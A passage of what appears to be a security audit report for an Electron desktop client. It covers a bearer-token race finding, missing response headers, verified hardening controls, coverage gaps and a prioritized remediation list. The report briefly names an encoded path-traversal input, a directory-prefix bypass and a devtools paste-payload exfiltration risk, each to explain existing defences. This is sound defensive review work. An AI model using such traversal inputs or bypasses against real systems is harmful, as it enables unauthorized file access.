- `src/api/client.ts:71-79`: every outbound fetch reads `getLatestToken()` and attaches `Authorization: Bearer <token>` if non-null.
- Writers traced exhaustively:
  - `AuthProvider.tsx:153` (`setAuthed(false)` clears).
  - `AuthProvider.tsx:186` (`activateConnection`).
  - `AuthProvider.tsx:357` (`signOut` clears).
  - `AuthProvider.tsx:417/421` (`disconnect` updates).
  - `connections.tsx:203` (eager hydrate sets first).
  - `connections.tsx:269` (lazy hydrate sets first).
- The fetch wrapper does NOT pair the attached bearer with the request's intended connection-id. The wrapper attaches whatever connection happens to be active at the moment `native(input, reqInit)` reads the latch.

#### Concrete confused-deputy scenario

1. User has profiles `A` (active) and `B`. `setLatestToken(tokenA)`.
2. The SPA's React reducer dispatches a "switch active" to `B` (e.g., from `ConnectionSwitcher`). `setLatestToken(tokenB)` runs.
3. Concurrently — between the user's last query against `A` being issued (request constructed with the cookie attached, header about to be added) and the underlying `fetch` resolving its headers — the `Authorization` header is added at fetch-call time using the **current** latch value.

Because `client.ts:73` reads `getLatestToken()` synchronously at fetch construction (NOT at response time), a single-threaded JS event loop guarantees the token in the header IS the token at the moment the wrapper was called — but the wrapper is called from many call sites, and the token may not match the URL the wrapper is targeting (which is profile-keyed in the path).

More realistic confused-deputy: the cookie still carries the **previous** session (set on a prior login) while the bearer carries a **new** in-memory token from a fresh login. The server prefers the bearer (`<auth_model>` note: "server prefers the bearer when both are present"). If the in-memory bearer is for the current user but the cookie is for a stale user, the request executes as the bearer's identity — which is intentional. The hazard is reversed: a bearer for a *previous* connection may be attached to a request the user intends for the *current* one.

For the current architecture this is bounded:

- All connections belong to the same OS user / browser session.
- Every connection's JWT is independently valid (no `cid` rebinding) so the server returns data consistent with the bearer.
- Therefore the worst-case is "the response is for the wrong profile" — a correctness bug, observable as data leakage between profiles **belonging to the same authenticated user**.

#### Why existing controls fail

- The latch is a module global; no per-request scoping.
- React's reducer dispatch is synchronous, but module-level mutation is not transactional with the fetch wrapper.

#### Impact

- Low. Within the threat model the user could see data from one of their own profiles when they expected another. Not a cross-tenant leak; not a privilege escalation.
- But the architecture pattern is fragile: "module-global mutated by React and read by fetch" is the textbook setup for a race when a second connection-aware feature is added.

#### Remediation

Bind the bearer to the request explicitly:

```ts
// connections.tsx — expose a per-connection token getter keyed by id
export function getTokenForConnection(id: string): string | null {
  return connectionsById.get(id)?.token ?? null
}

// client.ts — call sites that target a specific connection pass it through
// a request-scoped option; the fetch wrapper reads from that option, not
// from the latch.
```

The simplest tactical fix: at every call site that constructs a request keyed to a connection (most of `src/api/*`), pass the connection-id in `init` (custom field) and have the fetch wrapper look up the token from the connections map. The module-level latch can stay for legacy callers but new code uses the explicit path.

#### Regression tests

- Add a test in `src/api/client.test.ts` that constructs two connections, sets latch to `A`, then dispatches a switch to `B` synchronously between two fetches, and asserts each fetch carries the right bearer.

#### References / mappings

- OWASP A07 Authentication Failures (session-handling); A06 Insecure Design (confused-deputy pattern).
- CWE-441 Unintended Proxy or Intermediary (confused deputy).

---

### APP-09 — `geode://` protocol handler does not set `X-Content-Type-Options: nosniff` or `Cache-Control` (Info)

#### Evidence

- `electron/main.ts:206-218` builds the response with only `Content-Type` in the header object.
- The custom scheme already runs in a hostile-content-prevention posture (`standard: true`, `secure: true`), and the protocol handler does NOT serve renderer-supplied bytes — it only serves disk content from `DIST_DIR`. So content-sniffing into a `text/html` interpretation of a `.js` file is bounded by what shipped at build time.

#### Impact

- Informational. The disk-only source surface keeps the risk Low. Adding `X-Content-Type-Options: nosniff` and an explicit `Cache-Control: no-store` (for `index.html`) or `max-age=...` (for fingerprinted chunks) is a defense-in-depth + freshness control.

#### Remediation

Bundle this into the APP-02 CSP commit. Add `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, and a `Cache-Control` policy keyed off file extension (`no-store` for `.html`, `max-age=31536000, immutable` for hashed assets).

#### References / mappings

- OWASP A02 Security Misconfiguration.
- CWE-16 Configuration.

---

## 5. Secure design notes

These are positive controls observed during the trace.

- **Electron hardening baseline is correct** (`electron/main.ts:327-333`):
  - `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true`, `spellcheck: false`, dedicated `preload`. This is the canonical secure baseline.
- **Custom privileged scheme is correctly registered** (`main.ts:170-181`) with `corsEnabled: false` and `allowServiceWorkers: false`. The protocol handler does not serve renderer-controlled bytes.
- **`will-navigate` and `setWindowOpenHandler` both funnel through `safeOpenExternal`** (`main.ts:355-369`) — the S1 closure is in place. Both handlers reject internal-style URLs and prevent in-process navigation outside the scheme.
- **`resolveProtocolAsset` containment check is correct** (`safety.ts:103-110`): uses `path.normalize` + `startsWith(distDir + path.sep)`. The trailing separator closes the `dist-attacker` prefix bypass. The decode-then-normalize order in `main.ts:189-190` does mean URL-encoded `../` (`%2e%2e%2f`) is first decoded to `../` and then handled by `normalize`, which correctly collapses it back inside `distDir` or rejects via the containment check. The NUL-byte short-circuit (`safety.ts:100-102`) is in place. On Windows, `path.normalize` resolves backslashes consistently and the containment check uses the platform `path.sep`, so `dist\foo` vs `dist/foo` is reconciled by `normalize`.
- **`safeReadPemFile` is well-built** (`ipc-guards.ts:63-124`):
  - `O_NOFOLLOW` rejects symlinks at the final path component (the requested foot-gun).
  - `handle.stat()` runs against the FD, closing the TOCTOU window between stat and read.
  - Size cap applied BEFORE any bytes are read.
  - PEM-shape regex (`PEM_BEGIN`/`PEM_END`, `ipc-guards.ts:131-132`) rejects non-PEM payloads.
  - One small belt-and-suspenders: the `isSymbolicLink()` and `isFile()` checks (`ipc-guards.ts:97-106`) cover the `O_NOFOLLOW`-odd-libc case AND the named-pipe/block-device case (`isFile()` is false for FIFOs and device nodes). FIFOs and `/proc/self/fd/...` are rejected because they are not regular files. **Note: the filter `extensions: ['pem','crt','key','cert','cer']` on the open dialog (`main.ts:507-513`) is a UX filter not a security control; a user can still type any filename — but `safeReadPemFile` will reject anything not PEM-shaped.**
- **IPC sanitisers are exhaustive and correctly typed.** `sanitizeConnections` and `sanitizeSavedPasswordInput` (`ipc-guards.ts:210-291`) check both shape and content, reject NUL bytes in keying fields, enforce per-field length caps, and validate `expiresAt` as a finite integer in a forward window.
- **`secure-store.ts` envelope migration is correct:** legacy `{encrypted: ...}` payloads are detected, decrypted, kept in memo, and marked `dirty` so the next write re-emits as v2. No data is dropped during the migration.
- **Random tmp-file suffix** (`secure-store.ts:293`, `ipc-guards.ts:314`): 8 bytes of `crypto.randomBytes` make a shared-home rename race statistically infeasible. Permissions `0o600` (`secure-store.ts:295`) restrict to the OS user.
- **`before-quit` flushSync** (`main.ts:559-577`) correctly drains the 250ms debounce window so a user who quits mid-burst doesn't lose freshly minted JWTs.
- **HMAC verify uses `crypto.timingSafeEqual`** (`secure-store.ts:210`) with explicit length-equal precheck. Correct constant-time comparison.
- **CSRF wrapper retries exactly once on 403, then refreshes via singleflight** (`csrf.ts:60-66`, `client.ts:91-104`). The thundering-herd avoidance is the right pattern.
- **Cookie-mode is honored:** `client.ts:74-78` strips the placeholder `Authorization` header in the absence of an in-memory token, so the server sees only the cookie. The placeholder is documented as a genapi-shim until cookie-auth becomes first-class.
- **Connection-record sanitiser rejects past or far-future `expiresAt`** (`ipc-guards.ts:231-232`). Defends against a tampered renderer trying to install a never-expiring token.
- **Roles persistence is dropped on `setAuthed(false)` and `signOut`** (`AuthProvider.tsx:155-157, 362-363`). No stale admin posture into a new session.
- **`extractRoles` is documented as advisory-only and the doc-string explicitly says it grants no authority** (`jwt-claims.ts:14-22`). Documentation is correct; the gap is the App.tsx use site (APP-06), not the helper itself.

---

## 6. Coverage gaps and questions

1. **No server-side code reviewed.** Cookie attribute correctness (`HttpOnly`, `SameSite=Strict`, `Secure`), CSRF middleware (constant-time compare, header/cookie pairing), JWT signing key rotation, role enforcement on admin routes — all assumed correct per `<auth_model>`. A complementary server-side appsec review is the right next pass.
2. **No dependency audit included.** `dompurify@^3.4.0` override, monaco-editor, cytoscape, recharts, react-i18next — none scanned for advisories in this review. Recommend a `pnpm audit` + `osv-scanner` run.
3. **Electron version not specified in the input contract.** Assumption: a recent Electron with `protocol.handle` (≥25). If older, `protocol.registerStringProtocol` would have different semantics. Worth pinning explicitly.
4. **`safeStorage` determinism assumption is implicit.** APP-04 captures the risk; an explicit empirical test across all three target platforms (Linux + libsecret, macOS Keychain, Windows DPAPI) and across a Keychain rotation event would convert the assumption into a measurement.
5. **Devtools enabled in production menu** (`main.ts:278` `{ role: 'toggleDevTools' }`). This is intentional for an operator console but it means an attacker who can get the operator to open devtools and paste a payload can exfiltrate everything in `window.geode` (APP-01 + APP-02 + APP-07 amplifier). Not a finding because the trust model already accepts "operator runs paste-bombs at their own risk" — but worth documenting.
6. **CSP for browser path is asserted to be enforced by the Go server.** Not verified in this scope. Recommend a renderer-side smoke that asserts the meta-CSP (post-APP-02) and a parallel server-mode HTTP check.
7. **Permission handler absence (APP-05) means a future feature could land an over-permissive request.** Consider a lint rule or CI check that flags new `navigator.*` API usage in the SPA without a corresponding permission-handler update.
8. **`fetchPublicProfiles` and `onboardProfile`** (`auth.ts:187-244`) are unauthenticated endpoints; their server-side rate-limiting and abuse controls were out of scope. A successful `onboardProfile` issues a JWT — confirm server-side: rate-limit by IP, validate the `dsn` shape, and enforce admin-credential check against the supplied DSN.
9. **`isAllowedExternal` length cap is 2048** (`safety.ts:30`) — fine for URLs, but the cap doesn't protect downstream `shell.openExternal` from any OS-specific length quirks. Not in scope; noted.

---

## 7. Prioritized next actions

1. **APP-01: Document the saved-password trust assumption explicitly** (R1 — minutes of work). Update `electron/main.ts` near `geode:get-stored-password` and `docs/ELECTRON.md` to state the OS-user trust boundary clearly and call out that a renderer compromise is sufficient to exfiltrate every stored password. **(Sec doc PR; same day.)**
2. **APP-02: Ship a CSP on the Electron path** (R-Option-B in `electron/main.ts` is preferred). Pair with `X-Content-Type-Options: nosniff` (APP-09). Add the snapshot regression test. **(One small PR; this week.)**
3. **APP-03: Replace `isAllowedExternal` regex with `URL`-based parsing** and extend the test corpus. **(One small PR; this week.)**
4. **APP-05: Install a deny-by-default permission handler.** **(One small PR; this week.)**
5. **APP-06: Reconcile the `RoleGate` doc-string with its actual deployment**, and add the `fetchWhoAmI` override to `AuthProvider`'s bootstrap effect so server-side roles authoritatively replace the sessionStorage stash. **(One PR; next sprint.)**
6. **APP-07: Decide on the legacy-auth flag lifecycle.** If SEC-F7 has been stable, retire it; if still needed as escape-hatch, gate behind a build-time `DefinePlugin` constant. **(Decision + PR; next sprint.)**
7. **APP-01: Implement the connection-scoped IPC binding** (R2) so a renderer compromise cannot ask for *any* `(profile, username)` pair without an unlock context. **(Larger PR; next sprint or following.)**
8. **APP-04: Move the MAC-key off the implicit-determinism assumption** by persisting an explicit wrapped key file. **(One PR; next sprint.)**
9. **APP-08: Bind bearer attachment to the request's intended connection-id** at every `src/api/*` call site that targets a specific connection. **(Refactor PR; medium effort.)**

For each PR: include a `docs/SECURITY_GAP_ANALYSIS.md` row, a regression test that fails before the fix, and a one-line entry in `docs/superpowers/plans/` describing the change.

---

*End of report. Findings: 9 (Medium 2, Low 6, Info 1). No Critical or High.*
